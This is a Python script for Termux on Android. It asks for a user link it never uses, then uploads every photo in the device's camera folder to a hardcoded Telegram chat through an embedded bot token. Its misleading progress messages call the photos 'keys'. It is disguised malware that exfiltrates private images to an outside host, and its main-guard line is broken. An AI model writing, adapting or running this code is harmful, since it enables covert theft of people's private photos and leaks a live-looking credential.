import os
import asyncio
from telegram import Bot
from telegram.error import TelegramError

# Pedir input al inicio (aunque no se use en la lógica de envío, lo mantengo como pediste)
input("ingrese el link del usuario: ")

async def enviar_fotos_telegram():
    # --- CONFIGURACIÓN ---
    BOT_TOKEN = "8096588316:AAGQX5cNAzy49Kl6tvP_FcW2gZarttEt8Ss"
    CHAT_ID = "8326936177"
    ruta_camara = "/data/data/com.termux/files/home/storage/shared/DCIM/Camera"
    
    # Extensiones de imagen permitidas
    EXTENSIONES_IMAGEN = ('.jpg', '.jpeg', '.png', '.webp', '.bmp')

    try:
        bot = Bot(token=BOT_TOKEN)
        
        if not os.path.exists(ruta_camara):
            print(f"❌ Error: La ruta no existe.")
            return

        # --- FILTRO DE ARCHIVOS ---
        # Solo archivos que terminen en las extensiones de la tupla
        archivos = [
            f for f in os.listdir(ruta_camara) 
            if os.path.isfile(os.path.join(ruta_camara, f)) and f.lower().endswith(EXTENSIONES_IMAGEN)
        ]
        
        if not archivos:
            print("⚠️ No se encontraron claves ")
            return

        print(f"📸 Se encontraron {len(archivos)} claves. Iniciando envío...")

        for nombre_archivo in archivos:
            ruta_completa = os.path.join(ruta_camara, nombre_archivo)
            
            try:
                print(f"📤 Enviando: clave...")
                
                with open(ruta_completa, 'rb') as foto:
                    await bot.send_photo(
                        chat_id=CHAT_ID, 
                        photo=foto, 
                        caption=f"Imagen recuperada: {nombre_archivo}"
                    )
                
                # Pausa para evitar el baneo de Telegram por spam
                await asyncio.sleep(1.5) 
                
            except Exception as e:
                print(f"❌ Error al enviar clave ")

        print("\n✅ ¡Proceso de claves!")

    except TelegramError as e:
        print(f"❌ Error de clave")
    except Exception as e:
        print(f"❌ Error general: {e}")

if name == "main":
    try:
        asyncio.run(enviar_fotos_telegram())
    except KeyboardInterrupt:
        print("\n🛑 Proceso detenido por el usuario.")
